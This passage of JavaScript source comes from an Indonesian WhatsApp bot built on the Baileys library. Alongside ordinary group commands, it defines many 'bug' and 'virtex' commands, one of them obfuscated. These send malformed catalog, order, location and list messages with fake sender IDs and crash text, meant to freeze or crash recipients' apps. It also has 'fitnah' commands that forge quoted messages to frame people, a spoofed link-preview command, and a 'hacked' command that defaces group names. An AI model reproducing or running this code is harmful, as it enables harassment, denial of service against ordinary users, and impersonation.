					teks = `List Admin Group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
       case 'listonline':
             if (!isGroup) return reply(`*Group Only*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(nathan.chats.get(ido).presences), nathan.user.jid]
             nathan.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: ftroli, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
case 'join':
if (isGroup && !itsMe) return reply('Fitur Hanya Dapat Digunakan Dalam Private Chat!')
if (args.length < 1) return reply(`Kirim Command *${prefix}join* link grup`)
if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return reply(mess.error.Iv)
let code = args[0].replace('https://chat.whatsapp.com/', '')
nathan.acceptInvite(code)
 .then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
break
				case 'stag':
			if (!isGroup) return reply(mess.only.group)
			if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            nathan.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            nathan.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            nathan.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            nathan.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            nathan.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            nathan.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}stag`)
        }
        break
				case 'status':
case 'stats':
				var groups = nathan.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = nathan.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestamp = speed();
					const totalChat = await nathan.chats.all()
					const latensi = speed() - timestamp
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = nathan.user.phone
					status = `
╭────────────────── 
│
│Private Chat : ${privat.length}
│Group Chat : ${groups.length}
│Total Chat : ${totalChat.length}
│Speed : ${latensi.toFixed(4)} second
│Runtime : ${kyun(uptime)}
│Baterai : ${baterai.battery}
│Charged : ${baterai.isCharge}
│Mode : ${publik ? 'Public' : 'Self'}
│Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
│Penggunaan Ram : ${ram2}
│Hostname : ${os.hostname()}
│Platform : ${os.platform()}
│Uptime : ${kyun(os.uptime())}
│MNC : ${mnc}
│MCC : ${mcc}
│Device Model: ${nathan.user.phone.device_model}
│Device Manufactur : ${device_manufacturer}
│Wa Version: ${nathan.user.phone.wa_version}
│Os Version: ${nathan.user.phone.os_version}
│
└──────────────────`
reply(status)
break
				case 'tobc':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				nathan.updatePresence(from, Presence.composing)
					anu = await nathan.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await nathan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							nathan.sendMessage(_.jid, buff, audio, { quoted: ftroli })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await nathan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							nathan.sendMessage(_.jid, buff, sticker, { quoted: ftroli, contextInfo: { forwardingScore: 999, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
					case 'fdeface':
var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
                                var titlenye = nn.split("|")[1];
                                var descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmediad = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                mediad = await nathan.downloadAndSaveMediaMessage(encmediad)
                                ddatae = await imageToBase64(JSON.stringify(mediad).replace(/\"/gi, ''))
                                nathan.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })

                                break
					case 'online':
            if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				offline = false
				reply('Status : ONLINE')
				break
			case 'offline':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				offline = true
                waktuafk = Date.now()
                anuu = body.slice(9) ? body.slice(9) : '-'
                alasanafk = anuu
				reply('Status : OFFLINE')
				break
           case 'fitnahpc':
                if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fitnahpc 0|hai mark zuckerberg|hai juga`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    nathan.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
case 'tagall':
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : '*Info :*'
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `╠© @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					reply(teks)
					break
            case 'hidetag':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
            ht = body.slice(9)
                members_id = []
				for (let mem of groupMembers) {
					members_id.push(mem.jid)
				}
                mentions(ht, members_id, false)
                break
            case 'fitnah':
            if (!isGroup) return reply(mess.only.group)
                cr = body.slice(4)
                cs = cr.split('|')
                taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
							extendedTextMessage: {
								text: cs[1]
							}
						}
					}
				}
				nathan.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya Mana?')
              reply('Wait Mo Hek')
                tessgc = await getBuffer(`https://i.ibb.co/cyM9YyH/logoku.jpg`)
                   nathan.updateProfilePicture(from, tessgc)
                   await sleep(1000)
                nathan.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                nathan.groupUpdateDescription(from, `_${pushname} Telah Meretas Grup Ini_`)             
                await sleep(1000)
                nathan.sendMessage(from, 'Sukses Hack', text, {quoted: mek})
					break

	case 'xbug':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
await nathan.toggleDisappearingMessages(from, 0)
					break
					case 'bugpc2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
nathan.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${NamaOwner}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
				
					

					case 'bugtroli3':
              if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
nathan.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: ofrply,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
nathan.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bbaij72njnwjibdo16830nslm1782':
reply(`${ngazap(prefix)}`)
break
//By Xchildss X YuzzuKamiyaka x Pemuda Teknologi
case 'virtex':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
//--------------MAIL BOTZ-----------\\
  case 'jadivirus':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
               nathan.sendMessage(from, ini_buffer, sticker, { thumbnail : virgam, ftoko})
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            nathan.sendMessage(from, ini_buffer, image, { thumbnail : virgam, ftoko, options})
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
               nathan.sendMessage(from, ini_buffer, audio, { thumbnail : virgam, ftoko})
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await nathan.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await nathan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
          nathan.sendMessage(from, ini_buffer, video, { thumbnail : virgam, ftoko})
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/video dengan caption ${prefix}jadivirus`)
        }
        break
case 'tovirgam':
  case 'jadivirgam':
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await nathan.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await nathan.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							nathan.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
							fs.unlinkSync(ran)
						})
					}
					break
							case 'bugkatalogg':
   encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					mediaz = await nathan.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.jpg')

						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					nathan.sendMessage(from, hah, audio, {mimetype: 'image/jpg', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
imeu = await nathan.prepareMessage('0@s.whatsapp.net', hmm4, image)
imeg = imeu.message.imageMessage
res = await nathan.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "62895362282300@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  nathan.relayWAMessage(res)
  nathan.toggleDisappearingMessages(from,`Ups :v`,text)
  break
	case 'bugkatalog':
  					nathan.toggleDisappearingMessages(from,`ups`,text)
    hmm4 = fs.readFileSync(`./logoku.jpg`)
imeu = await nathan.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
res = await nathan.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "62895362282300@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  nathan.relayWAMessage(res)
  nathan.toggleDisappearingMessages(from,`Ups :v`,text)
  break
case 'bugloc':
function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./logoku.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);nathan[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
         break
case 'x':
             anu = body.slice(11)
              nathan.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
                case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 nathan.toggleDisappearingMessages(from, 0)
               nathan.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/cyM9YyH/logoku.jpg",
                "thumbnail": fs.readFileSync(`./logoku.jpg`),
                "sourceUrl": "https://youtube.com/c/ZEROBOT7"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        nathan.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{disText:'HMMM'},type:1}])
        nathan.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
nathan.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "Cie",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
nathan.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
nathan.toggleDisappearingMessages(from, 0)
break
//Done
case 'bugtroli2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${NamaBot}`
		        var grousp = await nathan.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        nathan.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        nathan.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugcombine':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 nathan.toggleDisappearingMessages(from, 'HACKED')
nathan.sendMessage(from, `${NamaBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    nathan.updatePresence(from, Presence.composing)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
case 'buglokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
nathan.updatePresence(from, Presence.composing)
		       nathan.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${NamaOwner}`,
						address: `${NamaBot}`,
                        jpegThumbnail: dfrply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaOwner}`,
    orderTitle: `${NamaBot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugpc':
					case 'bugpc':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
nathan.updatePresence(from, Presence.composing)
nathan.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
                case 'ytmp44444444':
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
						let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks2) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP4*\n\n *Title* : ${title}\n *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf Durasi Melebihi Batas Maksimal, Silahkan Klik Link Diatas_`)
